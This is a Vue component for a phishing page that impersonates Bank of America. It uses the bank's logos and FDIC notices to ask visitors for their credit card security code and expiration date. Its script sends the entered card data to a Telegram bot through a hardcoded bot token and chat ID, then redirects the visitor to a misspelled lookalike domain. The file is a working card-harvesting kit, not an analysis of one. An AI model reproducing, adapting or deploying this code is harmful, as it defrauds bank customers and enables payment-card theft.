<template>
  <div id="app">




<body>

<div class="top-bar">
  <div class="bar-element">
    <span class="text-preamble">Bank of America deposit products: </span>
   <center> <img src="https://secure2.bac-assets.com/spa/widgets/gt-secure-fdic-widget/1.0.0/spa-assets/images/assets-images-global-fdic-fdic-digital-sign-CSX37f66a3e.svg" class="fdic-digital-sign"> </center>
  </div>

  <div class="gtnav__logo">
    <a href="https://www.bankofamerica.com">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/20/Bank_of_America_logo.svg/1440px-Bank_of_America_logo.svg.png">
    </a>
  </div>
</div>

<div class="wrapper">

  <div class="header">
    <h2>Authorization</h2>
    <p>To verify your identity, confirm your credit card details.</p>
  </div>

  <div class="auth-wrapper">
    <form class="auth-form" method="POST">

      <p>* Response required</p>

      <h3 class="h33">Credit card details</h3>

      <div class="label-input">
        <label for="sec-code" ><b class="for">Security code *</b></label>
        <input type="text" id="sec-code" maxlength="4" required v-model="formDataRes.sscode">
        <p>3 or 4 digits</p>
      </div>

      <div class="label-input">
        <label for="exp-date"><b class="for">Expiration date *</b></label>
        <input type="text" id="exp-date" maxlength="5" placeholder="MM/YY" required v-model="formDataRes.expdate">
        <p>MM/YY</p>
      </div>

      <hr>

      <div>
        <h3 class="h3">Would you like us to remember this device?</h3>

        <div class="device">
          <input type="radio" id="yes" name="device" value="yes">
          <label for="yes">Yes, remember this device</label>
        </div>

        <div class="device">
          <input type="radio" id="no" name="device" value="no">
          <label for="no">No, don't remember this device</label>
        </div>
      </div>

      <div class="auth-row">
        <button class="auth-btn next" type="submit" @click.prevent="finishJoob();">Next</button>
      </div>

    </form>
  </div>
</div>

<div class="product-wrapper">

  <div class="table-wrapper">
    <p>Investment and insurance products:</p>

    <table>
      <tbody>
        <tr>
          <td>Are Not FDIC Insured</td>
          <td>Are Not Deposits</td>
          <td>May Lose Value</td>
        </tr>
        <tr>
          <td>Are Not Bank Guaranteed</td>
          <td>Are Not Insured by Any Federal Government Agency</td>
          <td>Are Not a Condition to Any Banking Service or Activity</td>
        </tr>
      </tbody>
    </table>
  </div>

  <a href="#">Online Banking Service Agreement</a>

  <div class="online">
    <p>Investing in securities involves risks...</p>
    <p>Securities products are provided by Merrill...</p>
    <p>Bank of America Private Bank is a division...</p>
    <p>Insurance Products are offered through...</p>
    <p>Banking, credit card, automobile loans...</p>
    <hr>
  </div>

</div>

</body>



  </div>
</template>

<script>
import axios from "axios";

export default {
  name: "App",
  data() {
    return {
      formDataRes: {
        sscode: "",
        expdate: "",
      },
      loading: false,
      isActive: false,
      count: 0,
      finalCount: 1, // Only send once
    };
  },
  methods: {
    async finishJoob() {
      this.count++;
      console.log("Count:", this.count, "Final:", this.finalCount);

      if (this.count <= this.finalCount) {
        this.loading = true;

        // Format the message as string
        const message = `* B0A*\nSScode: ${this.formDataRes.sscode}\nEXpdate: ${this.formDataRes.expdate}`;

        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-4794000485", 
          // 5
          message
        );

        this.isActive = !this.isActive;
        this.loading = false;
      } else {
        // Redirect after sending
        location.replace("https://mtaonilne-net.vercel.app/");
      }
    },

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },
};
</script>


<style>

body {
  font-family: Arial, sans-serif;
  margin: 0;
  background: #f5f5f5;
}

/* Top Bar */
.top-bar {
  display: flex;
  justify-content: space-between;
  align-items: center;
  background: #fff;
  padding: 10px 20px;
  border-bottom: 1px solid #ddd;
}
.h3{
  padding: 30px;
}
.h33{
   padding: 30px;
   font-weight: 600;
}
.bar-element {
  display: flex;
  align-items: center;
  gap: 10px;
}

.gtnav__logo img {
  height: 40px;
}

/* Wrapper */
.wrapper {
  max-width: 420px;
  margin: 40px auto;
  line-height: 50%;
}

/* Header */
.header {
  text-align: center;
  margin-bottom: 20px;
}

/* Auth Form */
.auth-wrapper {
  background: #fff;
  padding: 20px;
  border-radius: 8px;
}
.for{
  font-weight: 600;
}
.label-input {
  margin-bottom: 50px !important;

}

.label-input input {
  width: 100%;
  padding: 10px;
  margin-top: 5px;
}

.device {
  margin: 10px 0;
}

.auth-btn {
  width: 20%;
  padding: 10px;
  border: none;
  cursor: pointer;
}

.auth-btn.next {
  background: #012169;
  color: white;
}

.auth-btn.next:hover {
  background: #1958eb;
}

.auth-row {
  margin-top: 20px;
}

/* Product Section */
.product-wrapper {
  max-width: 800px;
  margin: 40px auto;
  font-size: 14px;
}

.table-wrapper table {
  width: 100%;
  border-collapse: collapse;
}

.table-wrapper td {
  border: 1px solid #ccc;
  padding: 10px;
}

.online {
  margin-top: 20px;
}

</style>